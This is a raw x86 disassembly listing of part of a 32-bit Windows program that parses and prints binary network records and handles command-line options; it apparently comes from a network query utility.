  407ed2:	call   0x40b8af
  407ed7:	push   eax
  407ed8:	push   0x403134
  407edd:	push   edi
  407ede:	call   DWORD PTR ds:0x413190
  407ee4:	add    esp,0xc
  407ee7:	cmp    ebx,0x21
  407eea:	jg     0x408482
  407ef0:	je     0x408404
  407ef6:	lea    eax,[ebx-0x1]
  407ef9:	cmp    eax,0x1b
  407efc:	ja     0x4086e2
  407f02:	movzx  eax,BYTE PTR [eax+0x408793]
  407f09:	jmp    DWORD PTR [eax*4+0x408767]
  407f10:	cmp    DWORD PTR [ebp-0x260],0x1
  407f17:	jne    0x4086e2
  407f1d:	lea    ebx,[esi+0x4]
  407f20:	cmp    ebx,DWORD PTR [ebp-0x25c]
  407f26:	ja     0x407c38
  407f2c:	mov    eax,DWORD PTR [ebp-0x274]
  407f32:	cmp    eax,0x4
  407f35:	jne    0x407f46
  407f37:	push   DWORD PTR [esi]
  407f39:	lea    ecx,[ebp-0x14]
  407f3c:	call   0x40c04d
  407f41:	jmp    0x4086d2
  407f46:	cmp    eax,0x7
  407f49:	jne    0x407f88
  407f4b:	push   DWORD PTR [esi]
  407f4d:	lea    ecx,[ebp-0x14]
  407f50:	call   0x40c04d
  407f55:	push   eax
  407f56:	push   0x40313c
  407f5b:	push   edi
  407f5c:	call   DWORD PTR ds:0x413190
  407f62:	movsx  ecx,BYTE PTR [esi+0x5]
  407f66:	movsx  eax,BYTE PTR [esi+0x6]
  407f6a:	shl    ecx,0x8
  407f6d:	add    ecx,eax
  407f6f:	movsx  eax,BYTE PTR [ebx]
  407f72:	push   ecx
  407f73:	push   eax
  407f74:	push   0x403140
  407f79:	push   edi
  407f7a:	call   DWORD PTR ds:0x413190
  407f80:	add    esp,0x1c
  407f83:	jmp    0x4086e2
  407f88:	push   eax
  407f89:	push   0x40314c
  407f8e:	jmp    0x4086d8
  407f93:	push   edi
  407f94:	push   0x20
  407f96:	call   DWORD PTR ds:0x41314c
  407f9c:	cmp    DWORD PTR [ebp+0xc],0xff
  407fa3:	pop    ecx
  407fa4:	pop    ecx
  407fa5:	je     0x407fc6
  407fa7:	mov    eax,0x403164
  407fac:	cmp    ebx,0xc
  407faf:	je     0x407fb6
  407fb1:	mov    eax,0x40316c
  407fb6:	push   eax
  407fb7:	push   0x403174
  407fbc:	push   edi
  407fbd:	call   DWORD PTR ds:0x413190
  407fc3:	add    esp,0xc
  407fc6:	push   0x1
  407fc8:	push   edi
  407fc9:	push   DWORD PTR [ebp-0x25c]
  407fcf:	mov    ecx,esi
  407fd1:	mov    edx,DWORD PTR [ebp-0x270]
  407fd7:	call   0x40518c
  407fdc:	jmp    0x4086e2
  407fe1:	movsx  eax,BYTE PTR [esi]
  407fe4:	inc    esi
  407fe5:	test   eax,eax
  407fe7:	je     0x408037
  407fe9:	mov    ebx,DWORD PTR [ebp-0x25c]
  407fef:	lea    ecx,[eax+esi*1]
  407ff2:	mov    DWORD PTR [ebp-0x264],ecx
  407ff8:	cmp    ecx,ebx
  407ffa:	ja     0x407c38
  408000:	push   esi
  408001:	push   eax
  408002:	push   0x40317c
  408007:	lea    eax,[ebp-0x214]
  40800d:	push   0x100
  408012:	push   eax
  408013:	call   DWORD PTR ds:0x413128
  408019:	lea    eax,[ebp-0x214]
  40801f:	push   eax
  408020:	push   0x403184
  408025:	push   edi
  408026:	call   DWORD PTR ds:0x413190
  40802c:	mov    esi,DWORD PTR [ebp-0x264]
  408032:	add    esp,0x20
  408035:	jmp    0x408051
  408037:	push   0x40318c
  40803c:	push   0x403184
  408041:	push   edi
  408042:	call   DWORD PTR ds:0x413190
  408048:	mov    ebx,DWORD PTR [ebp-0x25c]
  40804e:	add    esp,0xc
  408051:	movsx  ecx,BYTE PTR [esi]
  408054:	inc    esi
  408055:	test   ecx,ecx
  408057:	je     0x4086e2
  40805d:	lea    eax,[ecx+esi*1]
  408060:	cmp    eax,ebx
  408062:	ja     0x407c38
  408068:	push   esi
  408069:	push   ecx
  40806a:	push   0x403190
  40806f:	push   edi
  408070:	call   DWORD PTR ds:0x413190
  408076:	add    esp,0x10
  408079:	jmp    0x4086e2
  40807e:	mov    ebx,DWORD PTR [ebp-0x25c]
  408084:	lea    eax,[ebp-0x114]
  40808a:	mov    ecx,DWORD PTR [ebp-0x270]
  408090:	mov    edx,ebx
  408092:	push   0x100
  408097:	push   eax
  408098:	push   esi
  408099:	call   0x409e47
  40809e:	test   eax,eax
  4080a0:	js     0x4081e5
  4080a6:	add    esi,eax
  4080a8:	lea    eax,[ebp-0x114]
  4080ae:	push   eax
  4080af:	push   0x40313c
  4080b4:	push   edi
  4080b5:	call   DWORD PTR ds:0x413190
  4080bb:	mov    ecx,DWORD PTR [ebp-0x270]
  4080c1:	lea    eax,[ebp-0x114]
  4080c7:	add    esp,0xc
  4080ca:	mov    edx,ebx
  4080cc:	push   0x100
  4080d1:	push   eax
  4080d2:	push   esi
  4080d3:	call   0x409e47
  4080d8:	test   eax,eax
  4080da:	js     0x4081e5
  4080e0:	add    esi,eax
  4080e2:	lea    eax,[ebp-0x114]
  4080e8:	push   eax
  4080e9:	push   0x403198
  4080ee:	push   edi
  4080ef:	call   DWORD PTR ds:0x413190
  4080f5:	lea    eax,[esi+0x4]
  4080f8:	add    esp,0xc
  4080fb:	and    DWORD PTR [ebp-0x260],0x0
  408102:	mov    DWORD PTR [ebp-0x274],eax
  408108:	cmp    eax,ebx
  40810a:	ja     0x407c38
  408110:	mov    ecx,esi
  408112:	call   0x40a17b
  408117:	add    DWORD PTR [ebp-0x274],0x4
  40811e:	add    esi,0x4
  408121:	cmp    DWORD PTR [ebp-0x260],0x0
  408128:	mov    ecx,0x40318c
  40812d:	jne    0x408134
  40812f:	mov    ecx,0x402c32
  408134:	push   eax
  408135:	push   ecx
  408136:	push   0x4031a0
  40813b:	push   edi
  40813c:	call   DWORD PTR ds:0x413190
  408142:	mov    eax,DWORD PTR [ebp-0x260]
  408148:	add    esp,0x10
  40814b:	inc    eax
  40814c:	mov    DWORD PTR [ebp-0x260],eax
  408152:	cmp    eax,0x5
  408155:	mov    eax,DWORD PTR [ebp-0x274]
  40815b:	jl     0x408108
  40815d:	push   0x4031a8
  408162:	push   edi
  408163:	call   DWORD PTR ds:0x413190
  408169:	pop    ecx
  40816a:	pop    ecx
  40816b:	jmp    0x4086e2
  408170:	mov    ebx,DWORD PTR [ebp-0x25c]
  408176:	lea    eax,[esi+0x2]
  408179:	cmp    eax,ebx
  40817b:	ja     0x407c38
  408181:	movzx  eax,BYTE PTR [esi]
  408184:	shl    ax,0x8
  408188:	movzx  ecx,ax
  40818b:	movzx  eax,BYTE PTR [esi+0x1]
  40818f:	or     ecx,eax
  408191:	push   ecx
  408192:	push   0x4031ac
  408197:	push   edi
  408198:	call   DWORD PTR ds:0x413190
  40819e:	mov    ecx,DWORD PTR [ebp-0x270]
  4081a4:	lea    eax,[ebp-0x114]
  4081aa:	add    esp,0xc
  4081ad:	mov    edx,ebx
  4081af:	push   0x100
  4081b4:	push   eax
  4081b5:	lea    eax,[esi+0x2]
  4081b8:	push   eax
  4081b9:	call   0x409e47
  4081be:	test   eax,eax
  4081c0:	jns    0x4086cc
  4081c6:	test   BYTE PTR ds:0x40e128,0x2
  4081cd:	je     0x4081e5
  4081cf:	push   0x4031b4
  4081d4:	push   0x1
  4081d6:	call   0x40d391
  4081db:	pop    ecx
  4081dc:	push   eax
  4081dd:	call   DWORD PTR ds:0x413190
  4081e3:	pop    ecx
  4081e4:	pop    ecx
  4081e5:	push   0x40315c
  4081ea:	push   edi
  4081eb:	jmp    0x408747
  4081f0:	cmp    esi,DWORD PTR [ebp-0x26c]
  4081f6:	jae    0x4086e2
  4081fc:	mov    ebx,DWORD PTR [ebp-0x25c]
  408202:	lea    ecx,[esi+0x1]
  408205:	cmp    ecx,ebx
  408207:	ja     0x407c38
  40820d:	movzx  eax,BYTE PTR [esi]
  408210:	mov    esi,ecx
  408212:	test   eax,eax
  408214:	je     0x40823e
  408216:	lea    ecx,[eax+esi*1]
  408219:	mov    DWORD PTR [ebp-0x264],ecx
  40821f:	cmp    ecx,ebx
  408221:	ja     0x407c38
  408227:	push   esi
  408228:	push   eax
  408229:	push   0x4031c8
  40822e:	push   edi
  40822f:	call   DWORD PTR ds:0x413190
  408235:	mov    esi,DWORD PTR [ebp-0x264]
  40823b:	add    esp,0x10
  40823e:	cmp    esi,DWORD PTR [ebp-0x26c]
  408244:	jb     0x408202
  408246:	jmp    0x4086e2
  40824b:	push   edi
  40824c:	push   0x20
  40824e:	call   DWORD PTR ds:0x41314c
  408254:	mov    ebx,DWORD PTR [ebp-0x25c]
  40825a:	mov    edx,DWORD PTR [ebp-0x270]
  408260:	pop    ecx
  408261:	pop    ecx
  408262:	push   0x0
  408264:	push   edi
  408265:	push   ebx
  408266:	mov    ecx,esi
  408268:	call   0x40518c
  40826d:	push   0x4031d4
  408272:	push   edi
  408273:	mov    esi,eax
  408275:	call   DWORD PTR ds:0x413190
  40827b:	pop    ecx
  40827c:	pop    ecx
  40827d:	push   0x0
  40827f:	push   edi
  408280:	push   ebx
  408281:	jmp    0x407fcf
  408286:	cmp    DWORD PTR [ebp-0x260],0x1
  40828d:	jne    0x4086e2
  408293:	and    DWORD PTR [ebp-0x260],0x0
  40829a:	lea    eax,[esi+0x5]
  40829d:	sub    DWORD PTR [ebp-0x274],0x4
  4082a4:	mov    ebx,DWORD PTR [ebp-0x25c]
  4082aa:	mov    DWORD PTR [ebp-0x278],eax
  4082b0:	cmp    eax,ebx
  4082b2:	ja     0x407c38
  4082b8:	movzx  esi,BYTE PTR [esi+0x4]
  4082bc:	push   esi
  4082bd:	call   DWORD PTR ds:0x413038
  4082c3:	mov    DWORD PTR [ebp-0x264],eax
  4082c9:	test   eax,eax
  4082cb:	jne    0x4082e7
  4082cd:	push   esi
  4082ce:	push   0x4031ac
  4082d3:	push   edi
  4082d4:	call   DWORD PTR ds:0x413190
  4082da:	add    esp,0xc
  4082dd:	xor    edx,edx
  4082df:	mov    DWORD PTR [ebp-0x260],edx
  4082e5:	jmp    0x4082fe
  4082e7:	push   DWORD PTR [eax]
  4082e9:	push   0x4031e0
  4082ee:	push   edi
  4082ef:	call   DWORD PTR ds:0x413190
  4082f5:	mov    edx,DWORD PTR [ebp-0x260]
  4082fb:	add    esp,0xc
  4082fe:	mov    eax,DWORD PTR [ebp-0x274]
  408304:	and    DWORD PTR [ebp-0x268],0x0
  40830b:	dec    eax
  40830c:	test   eax,eax
  40830e:	jle    0x4086e2
  408314:	mov    ecx,DWORD PTR [ebp-0x278]
  40831a:	lea    esi,[ecx+0x1]
  40831d:	mov    DWORD PTR [ebp-0x27c],esi
  408323:	dec    eax
  408324:	mov    DWORD PTR [ebp-0x274],eax
  40832a:	mov    eax,DWORD PTR [ebp-0x27c]
  408330:	cmp    eax,ebx
  408332:	ja     0x407c38
  408338:	movsx  esi,BYTE PTR [ecx]
  40833b:	inc    ecx
  40833c:	mov    ebx,DWORD PTR [ebp-0x268]
  408342:	inc    eax
  408343:	mov    DWORD PTR [ebp-0x278],ecx
  408349:	mov    DWORD PTR [ebp-0x27c],eax
  40834f:	test   esi,0x200
  408355:	je     0x40839c
  408357:	mov    eax,DWORD PTR [ebp-0x264]
  40835d:	test   eax,eax
  40835f:	je     0x40837c
  408361:	push   DWORD PTR [eax]
  408363:	push   ebx
  408364:	call   DWORD PTR ds:0x413014
  40836a:	movzx  eax,ax
  40836d:	push   eax
  40836e:	call   DWORD PTR ds:0x41303c
  408374:	mov    edx,eax
  408376:	mov    DWORD PTR [ebp-0x260],edx
  40837c:	test   edx,edx
  40837e:	jne    0x40838b
  408380:	movzx  ecx,bx
  408383:	push   ecx
  408384:	push   0x4031e8
  408389:	jmp    0x408392
  40838b:	push   DWORD PTR [edx]
  40838d:	push   0x40313c
  408392:	push   edi
  408393:	call   DWORD PTR ds:0x413190
  408399:	add    esp,0xc
  40839c:	mov    edx,DWORD PTR [ebp-0x260]
  4083a2:	add    esi,esi
  4083a4:	inc    ebx
  4083a5:	test   bl,0x7
  4083a8:	jne    0x40834f
  4083aa:	mov    eax,DWORD PTR [ebp-0x274]
  4083b0:	mov    ecx,DWORD PTR [ebp-0x278]
  4083b6:	mov    DWORD PTR [ebp-0x268],ebx
  4083bc:	mov    ebx,DWORD PTR [ebp-0x25c]
  4083c2:	test   eax,eax
  4083c4:	jg     0x408323
  4083ca:	jmp    0x4086e2
  4083cf:	cmp    DWORD PTR [ebp-0x274],0x10
  4083d6:	jne    0x408718
  4083dc:	lea    eax,[esi+0x10]
  4083df:	cmp    eax,DWORD PTR [ebp-0x25c]
  4083e5:	ja     0x407c38
  4083eb:	lea    eax,[ebp-0x258]
  4083f1:	push   eax
  4083f2:	push   esi
  4083f3:	call   DWORD PTR ds:0x4131c4
  4083f9:	lea    eax,[ebp-0x258]
  4083ff:	jmp    0x4086d2
  408404:	mov    ebx,DWORD PTR [ebp-0x25c]
  40840a:	lea    edx,[esi+0x2]
  40840d:	cmp    edx,ebx
  40840f:	ja     0x407c38
  408415:	lea    eax,[edx+0x2]
  408418:	cmp    eax,ebx
  40841a:	ja     0x407c38
  408420:	lea    ecx,[eax+0x2]
  408423:	mov    DWORD PTR [ebp-0x264],ecx
  408429:	cmp    ecx,ebx
  40842b:	ja     0x407c38
  408431:	movzx  eax,BYTE PTR [eax]
  408434:	shl    ax,0x8
  408438:	movzx  ecx,ax
  40843b:	movzx  eax,BYTE PTR [edx+0x3]
  40843f:	or     ecx,eax
  408441:	movzx  eax,BYTE PTR [edx]
  408444:	push   ecx
  408445:	shl    ax,0x8
  408449:	movzx  ecx,ax
  40844c:	movzx  eax,BYTE PTR [edx+0x1]
  408450:	or     ecx,eax
  408452:	movzx  eax,BYTE PTR [esi]
  408455:	shl    ax,0x8
  408459:	movzx  edx,ax
  40845c:	movzx  eax,BYTE PTR [esi+0x1]
  408460:	push   ecx
  408461:	or     edx,eax
  408463:	push   edx
  408464:	push   0x40320c
  408469:	push   edi
  40846a:	call   DWORD PTR ds:0x413190
  408470:	mov    ecx,DWORD PTR [ebp-0x264]
  408476:	add    esp,0x14
  408479:	push   0x0
  40847b:	push   edi
  40847c:	push   ebx
  40847d:	jmp    0x407fd1
  408482:	cmp    ebx,0x27
  408485:	je     0x4086a6
  40848b:	cmp    ebx,0x64
  40848e:	je     0x408694
  408494:	jle    0x4086e2
  40849a:	cmp    ebx,0x66
  40849d:	jle    0x408676
  4084a3:	cmp    ebx,0xff01
  4084a9:	je     0x40855a
  4084af:	cmp    ebx,0xff02
  4084b5:	jne    0x4086e2
  4084bb:	mov    ebx,DWORD PTR [ebp-0x25c]
  4084c1:	lea    eax,[esi+0x4]
  4084c4:	cmp    eax,ebx
  4084c6:	ja     0x407c38
  4084cc:	mov    ecx,esi
  4084ce:	call   0x40a17b
  4084d3:	lea    ecx,[esi+0x4]
  4084d6:	mov    DWORD PTR [ebp-0x264],eax
  4084dc:	lea    esi,[ecx+0x4]
  4084df:	cmp    esi,ebx
  4084e1:	ja     0x407c38
  4084e7:	call   0x40a17b
  4084ec:	mov    DWORD PTR [ebp-0x27c],eax
  4084f2:	lea    eax,[esi+0x4]
  4084f5:	cmp    eax,ebx
  4084f7:	ja     0x407c38
  4084fd:	mov    ecx,esi
  4084ff:	call   0x40a17b
  408504:	mov    ecx,DWORD PTR [ebp-0x264]
  40850a:	mov    edx,0x402c2c
  40850f:	mov    DWORD PTR [ebp-0x268],eax
  408515:	test   ecx,0x10000
  40851b:	jne    0x408522
  40851d:	mov    edx,0x402c32
  408522:	mov    eax,0x402c34
  408527:	test   ecx,ecx
  408529:	js     0x408530
  40852b:	mov    eax,0x402c32
  408530:	push   DWORD PTR [ebp-0x268]
  408536:	push   DWORD PTR [ebp-0x27c]
  40853c:	push   edx
  40853d:	push   eax
  40853e:	push   ecx
  40853f:	push   0x402cc8
  408544:	push   edi
  408545:	call   DWORD PTR ds:0x413190
  40854b:	add    esp,0x1c
  40854e:	lea    ecx,[esi+0x4]
  408551:	push   0x0
  408553:	push   edi
  408554:	push   ebx
  408555:	jmp    0x407fd1
  40855a:	mov    ebx,DWORD PTR [ebp-0x25c]
  408560:	lea    eax,[esi+0x4]
  408563:	cmp    eax,ebx
  408565:	ja     0x407c38
  40856b:	mov    ecx,esi
  40856d:	call   0x40a17b
  408572:	lea    ecx,[esi+0x4]
  408575:	mov    DWORD PTR [ebp-0x268],eax
  40857b:	lea    esi,[ecx+0x4]
  40857e:	cmp    esi,ebx
  408580:	ja     0x407c38
  408586:	call   0x40a17b
  40858b:	mov    DWORD PTR [ebp-0x27c],eax
  408591:	lea    eax,[esi+0x4]
  408594:	cmp    eax,ebx
  408596:	ja     0x407c38
  40859c:	mov    ecx,esi
  40859e:	call   0x40a17b
  4085a3:	lea    ecx,[esi+0x4]
  4085a6:	mov    DWORD PTR [ebp-0x264],eax
  4085ac:	lea    esi,[ecx+0x4]
  4085af:	cmp    esi,ebx
  4085b1:	ja     0x407c38
  4085b7:	call   0x40a17b
  4085bc:	mov    ecx,DWORD PTR [ebp-0x268]
  4085c2:	mov    edx,0x402c2c
  4085c7:	mov    DWORD PTR [ebp-0x278],eax
  4085cd:	test   ecx,0x10000
  4085d3:	jne    0x4085da
  4085d5:	mov    edx,0x402c32
  4085da:	test   ecx,ecx
  4085dc:	mov    ecx,0x402c34
  4085e1:	js     0x4085e8
  4085e3:	mov    ecx,0x402c32
  4085e8:	push   eax
  4085e9:	push   DWORD PTR [ebp-0x264]
  4085ef:	push   DWORD PTR [ebp-0x27c]
  4085f5:	push   edx
  4085f6:	push   ecx
  4085f7:	push   DWORD PTR [ebp-0x268]
  4085fd:	push   0x403230
  408602:	push   edi
  408603:	call   DWORD PTR ds:0x413190
  408609:	mov    ecx,DWORD PTR [ebp-0x278]
  40860f:	add    esp,0x20
  408612:	test   ecx,ecx
  408614:	je     0x4086e2
  40861a:	lea    eax,[esi+0x4]
  40861d:	mov    DWORD PTR [ebp-0x268],eax
  408623:	dec    ecx
  408624:	mov    DWORD PTR [ebp-0x278],ecx
  40862a:	cmp    esi,DWORD PTR [ebp-0x26c]
  408630:	jae    0x4086e2
  408636:	cmp    eax,ebx
  408638:	ja     0x407c38
  40863e:	push   DWORD PTR [esi]
  408640:	lea    ecx,[ebp-0x14]
  408643:	call   0x40c04d
  408648:	push   eax
  408649:	push   0x4032a4
  40864e:	push   edi
  40864f:	call   DWORD PTR ds:0x413190
  408655:	mov    eax,DWORD PTR [ebp-0x268]
  40865b:	add    esp,0xc
  40865e:	mov    ecx,DWORD PTR [ebp-0x278]
  408664:	add    eax,0x4
  408667:	add    esi,0x4
  40866a:	mov    DWORD PTR [ebp-0x268],eax
  408670:	test   ecx,ecx
  408672:	jne    0x408623
  408674:	jmp    0x4086e2
  408676:	lea    eax,[esi+0x4]
  408679:	cmp    eax,DWORD PTR [ebp-0x25c]
  40867f:	ja     0x407c38
  408685:	mov    ecx,esi
  408687:	call   0x40a17b
  40868c:	push   eax
  40868d:	push   0x4031d8
  408692:	jmp    0x4086d8
  408694:	lea    eax,[esi+0x1]
  408697:	cmp    eax,DWORD PTR [ebp-0x25c]
  40869d:	ja     0x407c38
  4086a3:	push   esi
  4086a4:	jmp    0x4086d3
  4086a6:	mov    edx,DWORD PTR [ebp-0x25c]
  4086ac:	lea    eax,[ebp-0x114]
  4086b2:	mov    ecx,DWORD PTR [ebp-0x270]
  4086b8:	push   0x100
  4086bd:	push   eax
  4086be:	push   esi
  4086bf:	call   0x409e47
  4086c4:	test   eax,eax
  4086c6:	js     0x4081e5
  4086cc:	lea    eax,[ebp-0x114]
  4086d2:	push   eax
  4086d3:	push   0x40313c
  4086d8:	push   edi
  4086d9:	call   DWORD PTR ds:0x413190
  4086df:	add    esp,0xc
  4086e2:	push   0x402a34
  4086e7:	push   edi
  4086e8:	call   DWORD PTR ds:0x413190
  4086ee:	pop    ecx
  4086ef:	pop    ecx
  4086f0:	mov    ecx,DWORD PTR [ebp-0x26c]
  4086f6:	mov    DWORD PTR [ebp-0x26c],ecx
  4086fc:	mov    eax,DWORD PTR [ebp-0x280]
  408702:	test   ax,ax
  408705:	je     0x408735
  408707:	mov    esi,DWORD PTR [ebp-0x25c]
  40870d:	mov    ebx,DWORD PTR [ebp-0x270]
  408713:	jmp    0x407cea
  408718:	push   0x4031ec
  40871d:	push   edi
  40871e:	call   DWORD PTR ds:0x413190
  408724:	push   0x40315c
  408729:	push   edi
  40872a:	call   DWORD PTR ds:0x413190
  408730:	add    esp,0x10
  408733:	jmp    0x40874f
  408735:	xor    eax,eax
  408737:	jmp    0x408752
  408739:	push   0x4030f0
  40873e:	push   0x2
  408740:	call   0x40d391
  408745:	pop    ecx
  408746:	push   eax
  408747:	call   DWORD PTR ds:0x413190
  40874d:	pop    ecx
  40874e:	pop    ecx
  40874f:	push   0xfffffffd
  408751:	pop    eax
  408752:	mov    ecx,DWORD PTR [ebp-0x4]
  408755:	pop    edi
  408756:	pop    esi
  408757:	xor    ecx,ebp
  408759:	pop    ebx
  40875a:	call   0x40cd10
  40875f:	mov    esp,ebp
  408761:	pop    ebp
  408762:	ret    0x14
  408765:	mov    edi,edi
  408767:	adc    BYTE PTR [edi+0x40],bh
  40876a:	add    BYTE PTR [ebx-0x59ffbf81],dl
  408770:	xchg   BYTE PTR [eax+0x0],al
  408773:	jle    0x4086f5
  408775:	inc    eax
  408776:	add    BYTE PTR [esi-0x1effbf7e],al
  40877c:	jg     0x4087be
  40877e:	add    BYTE PTR [ebx-0x7e],cl
  408781:	inc    eax
  408782:	add    BYTE PTR [eax-0x7f],dh
  408785:	inc    eax
  408786:	add    al,dh
  408788:	add    DWORD PTR [eax+0x0],0x4083cf
  40878f:	loop   0x408717
  408791:	inc    eax
  408792:	add    BYTE PTR [eax],al
  408794:	add    DWORD PTR [edx],ecx
  408796:	or     al,BYTE PTR [edx]
  408798:	add    eax,DWORD PTR [edx]
  40879a:	add    al,BYTE PTR [edx]
  40879c:	or     al,BYTE PTR [ecx+eax*1]
  40879f:	add    eax,0x6080706
  4087a4:	pop    es
  4087a5:	or     BYTE PTR [eax],cl
  4087a7:	pop    es
  4087a8:	or     cl,BYTE PTR [edx]
  4087aa:	or     cl,BYTE PTR [edx]
  4087ac:	or     cl,BYTE PTR [edx]
  4087ae:	or     esp,ecx
  4087b0:	int3   
  4087b1:	int3   
  4087b2:	int3   
  4087b3:	int3   
  4087b4:	mov    edi,edi
  4087b6:	push   ebp
  4087b7:	mov    ebp,esp
  4087b9:	sub    esp,0x204
  4087bf:	mov    eax,ds:0x40e004
  4087c4:	xor    eax,ebp
  4087c6:	mov    DWORD PTR [ebp-0x4],eax
  4087c9:	mov    edx,DWORD PTR ds:0x4128fc
  4087cf:	mov    ecx,edx
  4087d1:	push   esi
  4087d2:	lea    esi,[ecx+0x1]
  4087d5:	mov    al,BYTE PTR [ecx]
  4087d7:	inc    ecx
  4087d8:	test   al,al
  4087da:	jne    0x4087d5
  4087dc:	sub    ecx,esi
  4087de:	mov    esi,0x100
  4087e3:	cmp    ecx,esi
  4087e5:	jb     0x4087f4
  4087e7:	push   0x2f
  4087e9:	push   0x2
  4087eb:	call   0x40b328
  4087f0:	pop    ecx
  4087f1:	pop    ecx
  4087f2:	jmp    0x40883a
  4087f4:	push   esi
  4087f5:	lea    eax,[ebp-0x104]
  4087fb:	push   eax
  4087fc:	push   0x4032bc
  408801:	push   edx
  408802:	call   DWORD PTR ds:0x4131a8
  408808:	add    esp,0x10
  40880b:	cmp    eax,0x1
  40880e:	jne    0x40883a
  408810:	lea    eax,[ebp-0x104]
  408816:	push   eax
  408817:	push   0x4032c8
  40881c:	lea    eax,[ebp-0x204]
  408822:	push   esi
  408823:	push   eax
  408824:	call   DWORD PTR ds:0x413128
  40882a:	lea    eax,[ebp-0x204]
  408830:	push   eax
  408831:	call   DWORD PTR ds:0x41316c
  408837:	add    esp,0x14
  40883a:	mov    ecx,DWORD PTR [ebp-0x4]
  40883d:	xor    ecx,ebp
  40883f:	pop    esi
  408840:	call   0x40cd10
  408845:	mov    esp,ebp
  408847:	pop    ebp
  408848:	ret    
  408849:	int3   
  40884a:	int3   
  40884b:	int3   
  40884c:	int3   
  40884d:	int3   
  40884e:	xor    eax,eax
  408850:	cmp    DWORD PTR [ecx],0xc0fe
  408856:	jne    0x408884
  408858:	cmp    DWORD PTR [ecx+0x4],0xffff0000
  40885f:	jne    0x408884
  408861:	cmp    DWORD PTR [ecx+0x8],eax
  408864:	jne    0x408884
  408866:	cmp    DWORD PTR [ecx+0xc],0x1000000
  40886d:	je     0x408881
  40886f:	cmp    DWORD PTR [ecx+0xc],0x2000000
  408876:	je     0x408881
  408878:	cmp    DWORD PTR [ecx+0xc],0x3000000
  40887f:	jne    0x408884
  408881:	xor    eax,eax
  408883:	inc    eax
  408884:	ret    
  408885:	int3   
  408886:	int3   
  408887:	int3   
  408888:	int3   
  408889:	int3   
  40888a:	mov    edi,edi
  40888c:	push   ebp
  40888d:	mov    ebp,esp
  40888f:	and    esp,0xfffffff8
  408892:	sub    esp,0x70
  408895:	push   esi
  408896:	xor    esi,esi
  408898:	push   edi
  408899:	push   esi
  40889a:	push   esi
  40889b:	push   0x1
  40889d:	push   esi
  40889e:	mov    DWORD PTR [esp+0x3c],esi
  4088a2:	mov    DWORD PTR [esp+0x18],esi
  4088a6:	mov    DWORD PTR [esp+0x24],esi
  4088aa:	call   DWORD PTR ds:0x413084
  4088b0:	push   esi
  4088b1:	call   DWORD PTR ds:0x4130a4
  4088b7:	mov    edi,DWORD PTR [ebp+0xc]
  4088ba:	push   0x2
  4088bc:	pop    eax
  4088bd:	cmp    DWORD PTR [ebp+0x8],eax
  4088c0:	jne    0x408917
  4088c2:	mov    ecx,DWORD PTR [edi+0x4]
  4088c5:	cmp    BYTE PTR [ecx],0x3f
  4088c8:	jne    0x4088d2
  4088ca:	movzx  eax,BYTE PTR [ecx+0x1]
  4088ce:	test   al,al
  4088d0:	je     0x408912
  4088d2:	push   0x3
  4088d4:	push   0x4032dc
  4088d9:	push   ecx
  4088da:	call   0x40d490
  4088df:	add    esp,0xc
  4088e2:	test   eax,eax
  4088e4:	je     0x408912
  4088e6:	push   0x3
  4088e8:	push   0x4032e0
  4088ed:	push   DWORD PTR [edi+0x4]
  4088f0:	call   0x40d490
  4088f5:	add    esp,0xc
  4088f8:	test   eax,eax
  4088fa:	je     0x408912
  4088fc:	push   0x6
  4088fe:	push   0x4032e4
  408903:	push   DWORD PTR [edi+0x4]
  408906:	call   0x40d490
  40890b:	add    esp,0xc
  40890e:	test   eax,eax
  408910:	jne    0x408917
  408912:	call   0x408e7d
  408917:	push   0x412120
  40891c:	push   0x202
  408921:	call   DWORD PTR ds:0x413050
  408927:	cmp    eax,0xffffffff
  40892a:	jne    0x408968
  40892c:	call   DWORD PTR ds:0x41302c
  408932:	push   esi
  408933:	push   esi
  408934:	mov    DWORD PTR [esp+0x30],eax
  408938:	lea    eax,[esp+0x18]
  40893c:	push   eax
  40893d:	push   esi
  40893e:	push   0x26
  408940:	push   esi
  408941:	push   0x900
  408946:	call   DWORD PTR ds:0x4130a0
  40894c:	test   eax,eax
  40894e:	je     0x408968
  408950:	push   DWORD PTR [esp+0x28]
  408954:	push   DWORD PTR [esp+0x14]
  408958:	call   DWORD PTR ds:0x41300c
  40895e:	push   DWORD PTR [esp+0x10]
  408962:	call   DWORD PTR ds:0x41308c
  408968:	call   0x40a37c
  40896d:	cmp    eax,0xffffffff
  408970:	jne    0x408987
  408972:	push   0x27
  408974:	push   0x2
  408976:	pop    eax
  408977:	push   eax
  408978:	call   0x40b328
  40897d:	pop    ecx
  40897e:	xor    edi,edi
  408980:	pop    ecx
  408981:	inc    edi
  408982:	jmp    0x408e2b
  408987:	push   0x10
  408989:	xor    ecx,ecx
  40898b:	pop    edx
  40898c:	inc    ecx
  40898d:	call   0x40b3dc
  408992:	mov    ds:0x411bf4,eax
  408997:	test   eax,eax
  408999:	jne    0x4089a3
  40899b:	push   0xe
  40899d:	pop    edi
  40899e:	jmp    0x408e2b
  4089a3:	call   0x409d82
  4089a8:	jmp    0x4089bc
  4089aa:	mov    ecx,DWORD PTR [edi]
  4089ac:	cmp    BYTE PTR [ecx],0x2d
  4089af:	jne    0x4089ca
  4089b1:	inc    ecx
  4089b2:	cmp    BYTE PTR [ecx],0x0
  4089b5:	je     0x4089ca
  4089b7:	call   0x4094e3
  4089bc:	mov    eax,DWORD PTR [ebp+0x8]
  4089bf:	add    edi,0x4
  4089c2:	sub    eax,0x1
  4089c5:	mov    DWORD PTR [ebp+0x8],eax
  4089c8:	jne    0x4089aa
  4089ca:	push   0x2
  4089cc:	pop    edx
  4089cd:	cmp    eax,edx
  4089cf:	jg     0x408912
  4089d5:	test   eax,eax
  4089d7:	je     0x4089e4
  4089d9:	mov    ecx,DWORD PTR [edi]
  4089db:	cmp    BYTE PTR [ecx],0x2d
  4089de:	je     0x4089e4
  4089e0:	mov    DWORD PTR [esp+0x2c],ecx
  4089e4:	cmp    eax,edx
  4089e6:	jne    0x408b6e
  4089ec:	mov    edx,DWORD PTR [edi+0x4]
  4089ef:	lea    ecx,[esp+0x38]
  4089f3:	sub    esp,0xc
  4089f6:	call   0x40bf08
  4089fb:	test   eax,eax
  4089fd:	je     0x408a28
  4089ff:	mov    eax,ds:0x40e130
  408a04:	test   eax,eax
  408a06:	je     0x408ad6
  408a0c:	push   0x10
  408a0e:	pop    ecx
  408a0f:	lea    esi,[esp+0x38]
  408a13:	mov    edi,eax
  408a15:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a17:	mov    DWORD PTR ds:0x40e12c,0x1
  408a21:	xor    esi,esi
